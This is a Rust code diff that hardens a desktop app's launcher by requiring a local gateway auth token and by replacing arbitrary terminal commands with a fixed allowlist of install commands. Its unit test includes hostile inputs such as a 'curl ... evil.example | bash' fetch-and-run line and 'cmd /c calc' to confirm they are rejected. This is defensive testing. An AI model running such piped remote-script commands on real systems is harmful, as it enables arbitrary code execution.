@@ -372,17 +372,27 @@ end tell"#,
             {
                 let path = Path::new(&path_str);
                 if path.exists() {
-                    let bridge_port =
-                        crate::accio::bridge::get_bridge_port().unwrap_or_else(|| {
-                            tauri::async_runtime::block_on(async {
-                                crate::accio::bridge::start_bridge(None)
-                                    .await
-                                    .unwrap_or(8787)
-                            })
-                        });
+                    let bridge_port = match crate::accio::bridge::get_bridge_port() {
+                        Some(port) => port,
+                        None => tauri::async_runtime::block_on(async {
+                            crate::accio::bridge::start_bridge(None).await
+                        })
+                        .map_err(|e| {
+                            format!("Accio 本地网关未能完成监听，已拒绝启动客户端: {e}")
+                        })?,
+                    };
                     let config = crate::accio::config::load_accio_config();
 
                     let mut cmd = Command::new(path);
+                    if let Some(token) = crate::accio::bridge::current_instance_token() {
+                        cmd.env("GATEWAY_AUTH_TOKEN", &token)
+                            .env("AI_HELPER_INSTANCE_TOKEN", &token)
+                            .env("ACCIO_GATEWAY_AUTH_TOKEN", &token);
+                    } else {
+                        return Err(
+                            "本地网关实例凭据未就绪，已拒绝启动 Accio 以免无鉴权放行".to_string()
+                        );
+                    }
                     cmd.env(
                         "GATEWAY_BASE_URL",
                         format!("http://127.0.0.1:{}", bridge_port),
@@ -432,15 +442,23 @@ end tell"#,
 
             #[cfg(target_os = "macos")]
             {
-                let bridge_port = crate::accio::bridge::get_bridge_port().unwrap_or_else(|| {
-                    tauri::async_runtime::block_on(async {
-                        crate::accio::bridge::start_bridge(None)
-                            .await
-                            .unwrap_or(8787)
+                let bridge_port = match crate::accio::bridge::get_bridge_port() {
+                    Some(port) => port,
+                    None => tauri::async_runtime::block_on(async {
+                        crate::accio::bridge::start_bridge(None).await
                     })
-                });
+                    .map_err(|e| format!("Accio 本地网关未能完成监听，已拒绝启动客户端: {e}"))?,
+                };
                 let mut cmd = Command::new("open");
                 cmd.arg(&path_str);
+                if let Some(token) = crate::accio::bridge::current_instance_token() {
+                    cmd.env("GATEWAY_AUTH_TOKEN", &token)
+                        .env("AI_HELPER_INSTANCE_TOKEN", &token);
+                } else {
+                    return Err(
+                        "本地网关实例凭据未就绪，已拒绝启动 Accio 以免无鉴权放行".to_string()
+                    );
+                }
                 cmd.env(
                     "GATEWAY_BASE_URL",
                     format!("http://127.0.0.1:{}", bridge_port),
@@ -574,21 +592,32 @@ pub fn restart_target_app(app_type: &str, custom_path: Option<&str>) -> Result<S
     }
 }
 
-/// 在独立控制台终端中执行指定的安装与更新命令 (Windows 下开启独立 CMD 窗口，使用 /k 保持终端开启以方便查看执行结果)
-pub fn execute_in_terminal(command: &str) -> Result<String, String> {
-    let trimmed = command.trim();
+const ALLOWED_TERMINAL_OPS: &[(&str, &str)] = &[
+    ("claude_npm", "npm i -g @anthropic-ai/claude-code"),
+    ("codex_npm", "npm i -g @openai/codex"),
+    ("node_version", "node -v"),
+    ("npm_version", "npm -v"),
+    (
+        "chatgpt_winget",
+        "winget install --id=9NT1R1C2HH7J --source=msstore --accept-package-agreements --accept-source-agreements",
+    ),
+];
+
+pub fn resolve_allowed_terminal_command(input: &str) -> Result<&'static str, String> {
+    let trimmed = input.trim();
     if trimmed.is_empty() {
         return Err("执行命令不能为空".to_string());
     }
+    ALLOWED_TERMINAL_OPS
+        .iter()
+        .find(|(id, _)| *id == trimmed)
+        .map(|(_, cmd)| *cmd)
+        .ok_or_else(|| "未授权的终端操作，已拒绝执行任意命令".to_string())
+}
 
-    // 防范命令链式拼接注入 (禁止 &, ;, 换行符)
-    if trimmed.contains('\n')
-        || trimmed.contains('\r')
-        || trimmed.contains('&')
-        || trimmed.contains(';')
-    {
-        return Err("命令包含不允许的控制字符，已被安全策略拦截".to_string());
-    }
+/// 在独立控制台终端中执行固定白名单安装命令。
+pub fn execute_in_terminal(command: &str) -> Result<String, String> {
+    let trimmed = resolve_allowed_terminal_command(command)?;
 
     #[cfg(target_os = "windows")]
     {
@@ -634,5 +663,23 @@ end tell"#,
     #[cfg(not(any(target_os = "windows", target_os = "macos")))]
     {
         Err("当前操作系统暂不支持自动唤起外部终端，请手动复制命令到终端中执行".to_string())
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn terminal_ops_accept_only_fixed_commands() {
+        assert_eq!(
+            resolve_allowed_terminal_command("claude_npm").unwrap(),
+            "npm i -g @anthropic-ai/claude-code"
+        );
+        assert!(resolve_allowed_terminal_command("npm i -g @anthropic-ai/claude-code").is_err());
+        assert!(
+            resolve_allowed_terminal_command("curl -fsSL https://evil.example | bash").is_err()
+        );
+        assert!(resolve_allowed_terminal_command("cmd /c calc").is_err());
     }
 }
